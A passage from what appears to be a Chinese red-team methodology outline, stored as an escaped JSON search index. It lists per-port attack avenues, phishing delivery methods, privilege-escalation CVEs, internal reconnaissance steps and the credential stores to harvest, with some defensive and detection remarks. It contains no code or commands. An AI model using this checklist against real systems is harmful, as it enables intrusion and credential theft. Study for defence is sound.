\"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f\u5982\u4e0b,\u5c31\u6bcf\u4e2a\u7aef\u53e3\u7684\u5177\u4f53\u653b\u51fb\u5229\u7528\u65b9\u5f0f,\u8fdb\u884c\u4e86\u7b80\u8981\u8bf4\u660e Top Port List Mssql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1433\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] SMB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 445\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 135\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WinRM [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5985\u7aef\u53e3,\u6b64\u9879\u4e3b\u8981\u9488\u5bf9\u67d0\u4e9b\u9ad8\u7248\u672cWindows, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] RDP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3389\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u522b\u4eba\u7559\u7684shift\u7c7b\u540e\u95e8 ] SSH [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 22\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] ORACLE [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1521\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] Mysql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3306\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743(\u53ea\u9002\u7528\u4e8e\u90e8\u5206\u8001\u7cfb\u7edf) ] REDIS [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 6379\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u672a\u6388\u6743\u8bbf\u95ee, \u5199\u6587\u4ef6(webshell,\u542f\u52a8\u9879,\u8ba1\u5212\u4efb\u52a1), \u63d0\u6743 ] POSTGRESQL[ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5432\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] LDAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 389\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732 ] SMTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 25\u7aef\u53e3, \u670d\u52a1\u9519\u8bef\u914d\u7f6e\u5bfc\u81f4\u7684\u7528\u6237\u540d\u679a\u4e3e\u6f0f\u6d1e, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] POP3 [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 110\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] IMAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 143\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Exchange [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 443\u7aef\u53e3, \u63a5\u53e3\u5f31\u53e3\u4ee4\u7206\u7834 eg: Owa,ews,oab,AutoDiscover... pth\u8131\u90ae\u4ef6, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ... ] VNC [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5900\u7aef\u53e3, \u5f31\u53e3\u4ee4 ] FTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 21\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u533f\u540d\u8bbf\u95ee/\u53ef\u5199, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Rsync [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 873\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Mongodb [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 27017\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4 ] TELNET [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 23\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u540e\u95e8\u690d\u5165 ] SVN [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3690\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] JAVA RMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1099\u7aef\u53e3, \u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u5229\u7528 ] CouchDB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5984\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee ]","title":"0x03 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u4e13\u95e8\u9488\u5bf9\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u7684\u5404\u79cdgetshell\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" )]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x04","text":"\u4f20\u7edf\u9493\u9c7c\u653b\u51fb\u5229\u7528\uff0c\u5b9e\u9645\u62a4\u7f51\u573a\u666f\u4e2d\u7528\u7684\u975e\u5e38\u9891\u7e41\uff0c\u7ec6\u8282\u975e\u5e38\u591a\uff0c\u6b64\u5904\u4e0d\u4e00\u4e00\u5217\u4e3e\uff0c\u9632\u5fa1\u91cd\u70b9 \u53d1\u4fe1\u524d\u671f\u51c6\u5907 \u679a\u4e3e\u6709\u6548\u7684\u76ee\u6807\u90ae\u7bb1\u7528\u6237\u540d\u5217\u8868 \u6279\u91cf\u63a2\u6d4b\u76ee\u6807\u90ae\u7bb1\u5f31\u53e3\u4ee4 \u4f2a\u9020\u53d1\u4fe1\u4eba [ \u53d1\u4fe1\u90ae\u670d\u642d\u5efa ] \u9493\u9c7c\u4fe1 [ \u9488\u5bf9\u4e0d\u540c\u884c\u4e1a\u4e00\u822c\u4e5f\u90fd\u4f1a\u4e8b\u5148\u51c6\u5907\u597d\u5404\u79cd\u5404\u6837\u7684\u9488\u5bf9\u6027\u7684\u53d1\u4fe1\u8bdd\u672f\u6a21\u677f,\u4ee5\u6b64\u6765\u63d0\u5230\u5b9e\u9645\u53d1\u4fe1\u6210\u529f\u7387 ] ...... \u5178\u578b\u6295\u9012\u65b9\u5f0f \u7b2c\u4e00\u79cd,\u76f4\u63a5\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u5e38\u89c4\u6728\u9a6c\u4fe1 \u4f20\u7edf\u5b8f\u5229\u7528 \u6346\u7ed1 exe[zip,7z] lnk chm \u81ea\u89e3\u538b \u6728\u9a6c\u94fe\u63a5 OLE CVE-2017-11882 [ \u5229\u7528\u6f0f\u6d1e\u89e6\u53d1 ] ... \u7b2c\u4e8c\u79cd,\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u9493\u9c7c\u94fe\u63a5,\u6bd4\u5982, \u5229\u7528\u5404\u79cd\u76ee\u6807\u767b\u5f55\u53e3\u7684\u9493\u9c7c\u9875\u9762\u6765\u7a83\u53d6\u5404\u79cd\u5185\u7f51\u8d26\u53f7\u5bc6\u7801 Vpn Mail OA Net ntlm hash [ \u8fdc\u7a0b\u6a21\u677f\u6ce8\u5165,pdf...\u9493hash,\u56fd\u5185ISP\u8fc7\u6ee4SMB\u6d41\u91cf\u4e0d\u9002\u7528 ] ......","title":"0x04 \u5165\u53e3\u6743\u9650\u83b7\u53d6"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x05","text":"\u4ee5\u4e0b\u53ea\u5355\u72ec\u6311\u4e86\u4e00\u4e9b\u5728 \u901a\u7528\u6027, \u7a33\u5b9a\u6027, \u6613\u7528\u6027, \u5b9e\u9645\u6210\u529f\u7387\u90fd\u76f8\u5bf9\u8f83\u597d\u7684\u6d1e\u548c\u65b9\u5f0f,\u5176\u5b83\u7684\u4e00\u4e9b\"\u8fb9\u7f18\u6027\"\u7684\u5229\u7528\u90fd\u6682\u672a\u63d0\u53ca Windows \u7cfb\u7edf\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ \u6210\u529f\u7684\u524d\u63d0\u662f,\u4fdd\u8bc1\u4e8b\u5148\u5df2\u505a\u597d\u5404\u79cd\u9488\u5bf9\u6027\u514d\u6740 ] BypassUAC [ win7 / 8 / 8.1 / 10 ] MS14-058[KB3000061] [\u91cd\u70b9] MS14-068[KB3011780] [\u91cd\u70b9] ms15-051[KB3045171] [\u91cd\u70b9] MS15-077[KB3077657] [\u91cd\u70b9] MS16-032[KB3124280] [\u91cd\u70b9] ms16-075 [\u91cd\u70b9] MS16-135[KB3199135] [\u91cd\u70b9] MS17-010[KB4013389] [\u91cd\u70b9] cve-2019-0708 [\u91cd\u70b9] CVE-2019-0803 [\u91cd\u70b9] CVE-2019-1322 & CVE-2019-1405 [\u91cd\u70b9] cve-2019-12750 [ \u8d5b\u95e8\u94c1\u514b(\u7528\u7684\u8f83\u591a)\u672c\u5730\u63d0\u6743 ] [\u91cd\u70b9] linux \u5185\u6838\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ linux-exploit-suggester ] CVE-2016-5195 [\u91cd\u70b9] CVE-2017-16995 CVE-2019-13272 \u5229\u7528\u5404\u7c7b\u7b2c\u4e09\u65b9\u670d\u52a1 / \u8f6f\u4ef6\u5de5\u5177\u63d0\u6743 Mssql [\u91cd\u70b9] Oracle [\u91cd\u70b9] Mysql \u5404\u7c7b\u7b2c\u4e09\u65b9\u8f6f\u4ef6dll\u52ab\u6301 [\u91cd\u70b9] suid\u6743\u9650 \u8ba1\u5212\u4efb\u52a1 \u5404\u79cd\u9519\u8bef\u670d\u52a1\u914d\u7f6e\u5229\u7528","title":"0x05 \u4e3b\u673a\u5b89\u5168 [ \u63d0\u6743\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x06","text":"\u641c\u96c6\u5f53\u524d\u5df2\u63a7\"\u8df3\u677f\u673a\"\u7684\u5404\u7c7b\u654f\u611f\u4fe1\u606f \u6ce8: \u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684,\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 \u67e5\u770b\u5f53\u524dshell\u6743\u9650 \u53ca \u8be6\u7ec6\u7cfb\u7edf\u5185\u6838\u7248\u672c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684 \u8be6\u7ec6ip\u914d\u7f6e,\u5305\u62ec \u6240\u5728\u57df, ip, \u63a9\u7801, \u7f51\u5173, \u4e3b\u5907 dns ip \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6700\u8fd1\u7684\u7528\u6237\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u6240\u6709\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55 [ \u4e3b\u8981\u9488\u5bf9linux,\u91cc\u9762\u53ef\u80fd\u5305\u542b\u7684\u6709\u5404\u7c7b\u654f\u611f\u8d26\u53f7\u5bc6\u7801,ip,\u654f\u611f\u670d\u52a1\u914d\u7f6e... ] \u83b7\u53d6\u672c\u673a\u6240\u6709 \u670d\u52a1/\u8fdb\u7a0b [\u5305\u62ec\u5404\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u6743\u9650,\u4e5f\u5305\u62ec\u76ee\u6807\u7cfb\u7edf\u4e2d\u7684\u53ef\u7591\u6076\u610f\u8fdb\u7a0b(\u6709\u53ef\u80fd\u662f\u540c\u884c\u7684\u9a6c)]/\u7aef\u53e3/\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f \u83b7\u53d6\u672c\u673a\u6240\u7528\u6740\u8f6f / \u76d1\u63a7\u79cd\u7c7b [ \u540e\u7eed\u597d\u9488\u5bf9\u6027\u7684\u505a\u514d\u6740 ] \u83b7\u53d6\u672c\u673a rdp / ssh \u7aef\u53e3\u5f00\u542f\u72b6\u6001 \u53ca \u5176\u9ed8\u8ba4\u7aef\u53e3\u53f7 \u83b7\u53d6\u672c\u673a\u6240\u6709\u7528\u6237\u7684rdp\u5916\u8fde\u8bb0\u5f55 \u83b7\u53d6\u672c\u673a\u7684\u6240\u6709SSH\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u767b\u5f55\u6210\u529f\u7684\u65e5\u5fd7 [ \u9488\u5bf9windows ] \u83b7\u53d6\u672c\u673a\u6240\u6709\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u8be6\u7ec6\u5217\u8868 [ \u4e3b\u8981\u4e3a\u6293\u5bc6\u7801,\u63d0\u6743,\u7559\u540e\u95e8\u505a\u51c6\u5907 ] \u83b7\u53d6\u672c\u673a\u5404\u4e2a\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4e66\u7b7e\u9875 \u53ca \u5386\u53f2\u6d4f\u89c8\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u521b\u5efa\u7684\u6240\u6709\u8ba1\u5212\u4efb\u52a1\u5217\u8868 \u53ca \u8ba1\u5212\u4efb\u52a1\u6240\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c\u5185\u5bb9 [ \u6709\u4e9b\u6267\u884c\u811a\u672c\u4e2d\u5f88\u53ef\u80fd\u5b58\u7684\u6709\u5404\u79cd\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 ] \u83b7\u53d6\u5f53\u524d\u7528\u6237 \u684c\u9762 \u53ca \u56de\u6536\u7ad9 \u91cc\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u5b58\u5728suid\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4ee3\u7406 [ ip & \u7aef\u53e3 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u7684\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u9879\u503c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 ipc \u8fde\u63a5 \u53ca \u5df2\u542f\u7528\u5171\u4eab \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u6302\u8f7d[mount] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u9632\u706b\u5899\u72b6\u6001 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u5206\u533a/\u76d8\u7b26\u53ca\u5176\u8be6\u7ec6\u4f7f\u7528\u60c5\u51b5 \u83b7\u53d6\u672c\u673a\u7684\u7d2f\u8ba1\u5f00\u673a\u65f6\u957f \u83b7\u53d6\u672c\u673aarp / dns\u7f13\u5b58 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u73af\u5883\u53d8\u91cf [ \u4e3b\u8981\u60f3\u770b\u770b\u76ee\u6807\u673a\u5668\u4e0a\u6709\u65e0python,jdk,ruby...\u7b49\u8bed\u8a00\u7684\u6267\u884c\u73af\u5883,\u540e\u671f\u53ef\u8bbe\u6cd5\u5229\u7528 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u672c\u5730\u7528\u6237\u53ca\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edfhost\u6587\u4ef6\u5185\u5bb9 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u786c\u4ef6\u8bbe\u5907\u4fe1\u606f[ \u4e3b\u8981\u4e3a\u5224\u65ad\u5f53\u524d\u673a\u5668\u662f\u5426\u4e3a\u865a\u62df\u673a ] \u8fdc\u7a0b\u622a\u5c4f\u6355\u6349\u76ee\u6807\u7528\u6237\u654f\u611f\u64cd\u4f5c \u7531\u4e8e\u4e0a\u8ff0\u5927\u90e8\u5206\u7684\u641c\u96c6\u52a8\u4f5c\u90fd\u662f\u57fa\u4e8e\u7cfb\u7edf\u5185\u7f6e\u5de5\u5177\u548c\u63a5\u53e3,\u6545,\u53ef\u5b8c\u5168\u4f9d\u9760EDR\u6765\u5b9e\u65f6\u6355\u6349\u5404\u7c7b\u654f\u611f\u8fdb\u7a0b\u4e0a\u62a5\u6076\u610f\u64cd\u4f5c \u5229\u7528\u5f53\u524d\u5df2\u63a7 \"\u8df3\u677f\u673a\", \u5206\u6790\u76ee\u6807\u5185\u7f51\u5927\u81f4\u7f51\u7edc\u62d3\u6251\u53ca\u6240\u6709\u5173\u952e\u6027\u4e1a\u52a1\u673a\u5668\u5206\u5e03 \u6279\u91cf\u6293\u53d6\u5185\u7f51\u6240\u6709windows\u673a\u5668\u540d \u548c \u6240\u5728 \"\u57df\" / \"\u5de5\u4f5c\u7ec4\u540d\" [smb\u63a2\u6d4b\u626b\u63cf] \u9488\u5bf9\u5185\u7f51\u7684\u5404\u79cd\u9ad8\u5371\u654f\u611f\u670d\u52a1\u5b9a\u4f4d[\"\u5b89\u5168\" \u7aef\u53e3\u626b\u63cf (\u5728\u907f\u514d\u5bf9\u65b9\u9632\u62a4\u62a5\u8b66\u62e6\u622a\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5404\u79cd\u5e38\u89c4\u670d\u52a1\u63a2\u6d4b\u8bc6\u522b)] \u5185\u7f51\u6279\u91cf Web Banner \u6293\u53d6,\u83b7\u53d6\u5173\u952e\u76ee\u6807\u4e1a\u52a1\u7cfb\u7edf\u5982\u4e0b \u5185\u7f51\u5404\u79cd\u6587\u4ef6[\u5171\u4eab]\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bweb\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u6570\u636e\u5e93\u670d\u52a1\u5668 \u5185\u7f51\u90ae\u4ef6\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51Vpn\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u5e38\u89c4\u8d44\u4ea7\u72b6\u6001\u76d1\u63a7\u670d\u52a1\u5668,eg: zabbix,nagios,cacti... \u5185\u7f51\u5404\u7c7b\u9632\u62a4\u7684\u4e3b\u63a7\u7aef,\u6bd4\u5982,\u9632\u706b\u5899,EDR,\u6001\u52bf\u611f\u77e5 \u4ea7\u54c1\u7684web\u4e3b\u63a7\u7aef... \u5185\u7f51\u65e5\u5fd7\u670d\u52a1\u5668 \u5185\u7f51\u8865\u4e01\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bOA,ERP,CRM,SRM,HR\u7cfb\u7edf... \u5185\u7f51\u6253\u5370\u670d\u52a1\u5668 \u5185\u7f51 MES \u7cfb\u7edf \u5185\u7f51\u865a\u62df\u5316\u670d\u52a1\u5668 / \u8d85\u878d\u5408\u5e73\u53f0 [Vmware ESX] \u5185\u7f51\u5821\u5792\u673a... \u5185\u7f51\u8fd0\u7ef4,\u7814\u53d1 \u90e8\u95e8\u5458\u5de5\u7684\u673a\u5668 \u5185\u7f51\u8def\u7531,\u4ea4\u6362\u8bbe\u5907... \u7b49\u7b49\u7b49 ... \u9488\u5bf9\u4ee5\u4e0a\u7684\u5404\u79cd\u5e38\u89c4\u5185\u7f51\u63a2\u6d4b\u626b\u63cf,\u5176\u5b9e\u5728\u6d41\u91cf\u4e0a\u90fd\u4f1a\u6709\u975e\u5e38\u6e05\u6670\u7684\u8868\u73b0 \u901a\u8fc7\u5728\u4e00\u4e9b\u5173\u952e\u8282\u70b9\u8bbe\u5907/\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u63a2\u9488\u641c\u96c6\u6d41\u91cf,\u518d\u914d\u5408\u5927\u6570\u636e\u5173\u8054\u5206\u6790\u67e5\u627e\u5404\u79cd\u654f\u611f\u7279\u5f81,\u7406\u8bba\u4e0a\u662f\u76f8\u5bf9\u5bb9\u6613\u53d1\u73b0\u5404\u7c7b\u626b\u63cf\u63a2\u6d4b\u75d5\u8ff9\u7684, \u9488\u5bf9\u5404\u7c7b\u5df2\u77e5\u7cfb\u7edf\u9ad8\u5371RCE\u6f0f\u6d1e\u7684\u6279\u91cf\u63a2\u6d4b\u8bc6\u522b\u4e0e\u5229\u7528 MS08-067 [ \u5176\u5b9e,\u67d0\u4e9b\u7279\u6b8a\u884c\u4e1a\u7684\u7cfb\u7edf\u53ef\u80fd\u975e\u5e38\u8001,\u6781\u5c11\u66f4\u65b0,\u6545,\u8fd8\u662f\u6709\u5b58\u5728\u7684\u53ef\u80fd ] MS17-010 CVE-2019-0708 \u5176\u5b9e\u9488\u5bf9\u6b64\u7c7b\u6f0f\u6d1e\u7684\u653b\u51fb\u5229\u7528\u8bc6\u522b,\u5c31\u663e\u5f97\u6bd4\u8f83\u76f4\u767d\u4e86,\u901a\u8fc7\u6df1\u5165\u5206\u6790\u6bcf\u79cd\u6f0f\u6d1e\u5728\u5b9e\u9645\u653b\u51fb\u5229\u7528\u8fc7\u7a0b\u6240\u4ea7\u751f\u7684\u4e00\u4e9b\u5178\u578b\u6d41\u91cf\u7279\u5f81\u548c\u7cfb\u7edf\u65e5\u5fd7\u5373\u53ef\u5927\u81f4\u5224\u65ad","title":"0x06 \u5185\u7f51\u5b89\u5168 [ \u654f\u611f\u4fe1\u606f\u641c\u96c6\uff0c\u9632\u5fa1\u91cd\u70b9\uff0c\u53ef\u5728\u6b64\u9879\u4e25\u683c\u9650\u5236\u5404\u79cd\u7cfb\u7edf\u5185\u7f6e\u547d\u4ee4\u6267\u884c ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x07","text":"\u4e3b\u52a8\u5bc6\u7801\u641c\u96c6 \u6ce8:\u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u6216\u8005\u5728\u6307\u5b9a\u7528\u6237\u6743\u9650\u4e0b\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684 \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0, \u6b64\u9879\u975e\u9632\u5fa1\u91cd\u70b9, \u56e0\u4e3a\u538b\u6839\u4e5f\u4e0d\u597d\u9632 \u6279\u91cf\u6293\u53d6\u5f53\u524d\u673a\u5668\u4e0a\u7684 \"\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\" \u6bd4\u5982,\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e\u6587\u4ef6,\u5404\u7c7b\u670d\u52a1\u81ea\u8eab\u7684\u914d\u7f6e\u6587\u4ef6(redis,http basic...)... \u60f3\u529e\u6cd5 \"\u63a7\u5236\u76ee\u6807 \u8fd0\u7ef4\u7ba1\u7406 / \u6280\u672f\u4eba\u5458 \u7684\u5355\u673a,\u4ece\u8fd9\u4e9b\u673a\u5668\u4e0a\u53bb\u641c\u96c6\u53ef\u80fd\u4fdd\u5b58\u7740\u5404\u7c7b\u654f\u611f\u7f51\u7edc\u8d44\u4ea7\u7684\u8d26\u53f7\u5bc6\u7801\u8868\" \u6bd4\u5982, .ls,.doc,*.docx, *.txt.... \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 \u6bd4\u5982,Navicat,SSMS[MSSQL\u81ea\u5e26\u5ba2\u6237\u7aef\u7ba1\u7406\u5de5\u5177,\u91cc\u9762\u4e5f\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u5bc6\u7801(\u52a0\u5bc6\u540e\u7684base64)] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf \"\u6ce8\u518c\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" [ Windows ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709 \"\u672c\u5730\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801/hash\" [ Windows & linux ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 \"\u7528\u6237token\" [ Windows ] \u6293\u53d6 \"windows\u51ed\u636e\u7ba1\u7406\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6 \"MSTSC \u5ba2\u6237\u7aef\u4e2d\u4fdd\u5b58\u7684\u6240\u6709rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6\u5404\u7c7b \"VNC\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u8fde\u63a5\u5bc6\u7801\" \u6293\u53d6 \"GPP\u76ee\u5f55\u4e0b\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801\" [ \u5305\u62ec\u7ec4\u7b56\u7565\u76ee\u5f55\u4e2dXML\u91cc\u4fdd\u5b58\u7684\u5bc6\u7801hash \u548c NETLOGON\u76ee\u5f55\u4e0b\u7684\u67d0\u4e9b\u811a\u672c\u4e2d\u4fdd\u5b58\u7684\u8d26\u53f7\u5bc6\u7801 ] \u6293\u53d6\u5404\u7c7b \"SSH\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdlinux\u7cfb\u7edf\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\", SecureCRT,Xshell,WinSCP,putty \u6293\u53d6\u5404\u7c7b \"\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdweb\u767b\u5f55\u5bc6\u7801\",Chrome [360\u6d4f\u89c8\u5668],Firefox,IE,QQ\u6d4f\u89c8\u5668 \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" \u6293\u53d6\u5404\u7c7b \"FTP\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdftp\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\", filezila, xftp... \u6293\u53d6\u5404\u7c7b \"\u90ae\u4ef6\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\", forxmail, thunderbird... \u6293\u53d6\u5404\u7c7b \"SVN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u6240\u6709\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\u53ca\u9879\u76ee\u5730\u5740\" \u6293\u53d6\u5404\u7c7b \"VPN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdvpn\u94fe\u63a5\u8d26\u53f7\u5bc6\u7801\" \u88ab\u52a8\u5bc6\u7801\u641c\u96c6 [ \u7b49\u7740\u7ba1\u7406\u5458\u81ea\u5df1\u6765\u9001\u5bc6\u7801 ] [\u6ce8: \u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684, 